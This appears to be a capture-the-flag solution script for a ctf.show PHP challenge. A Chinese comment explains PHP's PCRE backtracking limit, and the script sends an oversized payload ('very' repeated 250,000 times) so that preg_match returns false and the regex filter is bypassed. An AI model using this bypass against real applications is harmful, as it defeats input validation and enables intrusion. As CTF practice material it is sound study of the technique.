"""
PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit
回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false

"""
import requests
url="http://d5159e98-0c60-4558-98ca-1a4dc9ae2613.challenge.ctf.show/"
data={
	'f':'very'*250000+'36Dctfshow'
}
r=requests.post(url,data=data)
print(r.text)
